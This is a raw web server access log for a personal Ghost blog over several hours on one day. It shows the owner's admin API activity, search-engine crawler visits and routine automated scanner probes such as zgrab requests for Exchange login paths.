83.29.176.162 - - [24/Jan/2022:10:07:23 +0100] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3A%5Bdraft%2Cscheduled%2Cpublished%2Csent%5D HTTP/2.0" 200 7529 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:23 +0100] "GET /ghost/api/canary/admin/tags/?limit=all HTTP/2.0" 200 397 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:23 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:23 +0100] "GET /ghost/api/canary/admin/users/?limit=all&include=roles HTTP/2.0" 200 846 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:23 +0100] "GET /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1396 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:24 +0100] "GET /ghost/api/canary/admin/members/?limit=1&filter=subscribed%3Atrue&include=labels%2CemailRecipients HTTP/2.0" 200 101 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:24 +0100] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1857 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:24 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:32 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1452 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:43 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1488 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:07:43 +0100] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3A%5Bdraft%2Cscheduled%2Cpublished%2Csent%5D HTTP/2.0" 200 7607 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
192.241.211.165 - - [24/Jan/2022:10:10:38 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
43.131.22.118 - - [24/Jan/2022:10:11:53 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
192.241.211.199 - - [24/Jan/2022:10:12:52 +0100] "GET /owa/auth/x.js HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.211.11 - - [24/Jan/2022:10:15:14 +0100] "GET /owa/auth/logon.aspx HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
66.249.69.57 - - [24/Jan/2022:10:29:40 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.57 - - [24/Jan/2022:10:29:41 +0100] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 13064 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
83.29.176.162 - - [24/Jan/2022:10:37:16 +0100] "GET /ghost/ HTTP/2.0" 200 1553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/users/me/?include=roles HTTP/2.0" 200 755 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/site/ HTTP/2.0" 200 339 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/config/ HTTP/2.0" 200 239 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1857 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/notifications/ HTTP/2.0" 200 378 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/members/stats/count/ HTTP/2.0" 200 42 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:17 +0100] "GET /ghost/api/canary/admin/pages/?limit=30&page=1&filter=status%3A%5Bdraft%2Cscheduled%2Cpublished%2Csent%5D HTTP/2.0" 200 1711 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:18 +0100] "GET /ghost/api/canary/admin/tags/?limit=all HTTP/2.0" 200 397 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:18 +0100] "GET /ghost/api/canary/admin/users/?limit=all&include=roles HTTP/2.0" 200 846 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:18 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:20 +0100] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3A%5Bdraft%2Cscheduled%2Cpublished%2Csent%5D HTTP/2.0" 200 7607 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:20 +0100] "GET /ghost/api/canary/admin/tags/?limit=all HTTP/2.0" 200 397 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:20 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:20 +0100] "GET /ghost/api/canary/admin/users/?limit=all&include=roles HTTP/2.0" 200 846 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:21 +0100] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3Adraft HTTP/2.0" 200 4007 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:22 +0100] "GET /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1488 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:22 +0100] "GET /ghost/api/canary/admin/members/?limit=1&filter=subscribed%3Atrue&include=labels%2CemailRecipients HTTP/2.0" 200 101 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:22 +0100] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1857 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:22 +0100] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:31 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1553 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:10:37:40 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1572 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
162.250.127.202 - - [24/Jan/2022:10:43:59 +0100] "GET http://azenv.net/ HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
35.233.62.116 - - [24/Jan/2022:10:56:58 +0100] "GET / HTTP/1.1" 301 162 "-" "python-requests/2.27.1"
35.175.178.233 - - [24/Jan/2022:10:58:49 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
35.175.178.233 - - [24/Jan/2022:10:58:50 +0100] "GET /rss/ HTTP/1.1" 200 3443 "-" "Forem Feeds Importer"
66.249.69.61 - - [24/Jan/2022:10:59:40 +0100] "GET /weekly-stories-2/amp/ HTTP/1.1" 200 6563 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.59 - - [24/Jan/2022:11:20:41 +0100] "GET /weekly-stories-3/amp/ HTTP/1.1" 200 6261 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
190.94.138.19 - - [24/Jan/2022:11:45:06 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
190.94.138.19 - - [24/Jan/2022:11:45:06 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.69.61 - - [24/Jan/2022:11:50:41 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.57 - - [24/Jan/2022:11:50:42 +0100] "GET /weekly-stories/ HTTP/1.1" 200 15398 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
83.29.176.162 - - [24/Jan/2022:12:03:57 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1638 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:12:04:04 +0100] "PUT /ghost/api/canary/admin/posts/61cb3be24df07d00013ddd90/ HTTP/2.0" 200 1667 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
66.249.69.61 - - [24/Jan/2022:12:15:41 +0100] "GET /rss/ HTTP/1.1" 200 3448 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
20.191.45.212 - - [24/Jan/2022:12:20:38 +0100] "GET / HTTP/1.1" 301 162 "http://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [24/Jan/2022:12:20:38 +0100] "GET / HTTP/1.1" 200 13172 "https://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [24/Jan/2022:12:20:38 +0100] "GET /favicon.png HTTP/1.1" 200 2741 "https://krzwiatrzyk.eu/favicon.png" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
83.29.176.162 - - [24/Jan/2022:12:23:57 +0100] "GET /ghost/api/canary/admin/members/stats/count/ HTTP/2.0" 200 42 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
83.29.176.162 - - [24/Jan/2022:12:23:57 +0100] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3Adraft HTTP/2.0" 200 4187 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19"
157.55.39.214 - - [24/Jan/2022:12:26:32 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.69.61 - - [24/Jan/2022:12:30:41 +0100] "GET /rss/ HTTP/1.1" 200 3443 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:12:35:41 +0100] "GET /weekly-stories-2/ HTTP/1.1" 200 15977 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.22 - - [24/Jan/2022:12:50:42 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.22 - - [24/Jan/2022:12:50:42 +0100] "GET /weekly-stories/ HTTP/1.1" 200 15403 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.26 - - [24/Jan/2022:12:51:14 +0100] "GET /assets/scripts/main.js?v=ffd8b13e55 HTTP/1.1" 200 9990 "https://www.krzwiatrzyk.eu/weekly-stories/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.24 - - [24/Jan/2022:12:52:18 +0100] "GET /assets/styles/main.css?v=ffd8b13e55 HTTP/1.1" 200 14070 "https://www.krzwiatrzyk.eu/weekly-stories/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.94.140 - - [24/Jan/2022:12:55:46 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
125.64.94.140 - - [24/Jan/2022:12:55:49 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:12:55:51 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [24/Jan/2022:12:55:52 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
66.249.69.61 - - [24/Jan/2022:13:05:41 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.36 - - [24/Jan/2022:13:15:40 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
118.123.105.68 - - [24/Jan/2022:13:29:09 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.68 - - [24/Jan/2022:13:29:10 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:11 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:14 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:15 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:16 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:17 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:18 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.68 - - [24/Jan/2022:13:29:19 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
157.55.39.214 - - [24/Jan/2022:13:42:58 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.179 - - [24/Jan/2022:13:48:20 +0100] "GET /kubernetes-headless-service/ HTTP/2.0" 200 16206 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
82.197.222.123 - - [24/Jan/2022:13:49:21 +0100] "GET /users/sign_in HTTP/1.1" 200 1345 "-" "-"
66.249.69.61 - - [24/Jan/2022:13:50:41 +0100] "GET /tool-stack/ HTTP/1.1" 200 12444 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:13:52:23 +0100] "GET /sitemap.xml HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
138.68.249.116 - - [24/Jan/2022:14:03:04 +0100] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 150 "-" "-"
178.33.215.135 - - [24/Jan/2022:14:05:40 +0100] "HEAD / HTTP/2.0" 200 0 "-" "-"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-2.png HTTP/1.1" 200 18100 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-1.png HTTP/1.1" 200 18781 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-9.png HTTP/1.1" 200 9699 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/obraz_2021-10-02_103514.png HTTP/1.1" 200 14588 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-8.png HTTP/1.1" 200 27358 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-10.png HTTP/1.1" 200 9335 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/image-14.png HTTP/1.1" 200 10295 "-" "Mozilla/5.0 Safari/537.36"
172.18.0.1 - - [24/Jan/2022:14:05:42 +0100] "GET /content/images/2021/10/Kafka-Topic-Partition.drawio--2-.png HTTP/1.1" 200 28195 "-" "Mozilla/5.0 Safari/537.36"
66.249.69.61 - - [24/Jan/2022:14:05:42 +0100] "GET /kubernetes-headless-service/amp/ HTTP/1.1" 200 7251 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.100 - - [24/Jan/2022:14:35:41 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.113 - - [24/Jan/2022:14:35:42 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.102 - - [24/Jan/2022:14:35:42 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.117 - - [24/Jan/2022:14:35:43 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.230.216.203 - - [24/Jan/2022:14:45:41 +0100] "GET /ab2g HTTP/1.1" 400 150 "-" "-"
157.230.216.203 - - [24/Jan/2022:14:45:41 +0100] "GET /ab2h HTTP/1.1" 400 150 "-" "-"
66.249.69.61 - - [24/Jan/2022:14:50:41 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.61 - - [24/Jan/2022:14:50:42 +0100] "GET /weekly-stories-3/amp/ HTTP/1.1" 200 6266 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
